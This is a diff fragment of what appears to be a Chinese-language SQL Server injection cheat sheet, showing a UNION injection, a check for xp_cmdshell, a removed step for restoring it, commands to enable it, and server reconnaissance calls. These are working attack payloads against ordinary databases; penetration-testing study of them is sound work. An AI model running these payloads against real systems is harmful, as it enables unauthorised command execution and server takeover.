@@ -70,10 +70,7 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 
 ```sql
 --判断xp_cmdshell是否被删除
-?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
-
---若xp_cmdshell被删除，可恢复且支持绝对路径的恢复 
-exec master..sp_addextendedproc 'xp_cmdshell','xplog70.dll';
+?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell');
 
 --开启xp_cmdshell
 exec sp_configure 'show advanced options',1;
@@ -113,9 +110,3 @@ exec master..xp_getnetname
 #服务器安全模式信息
 exec master..xp_loginconfig
 ```
-
-
-
-
-
-
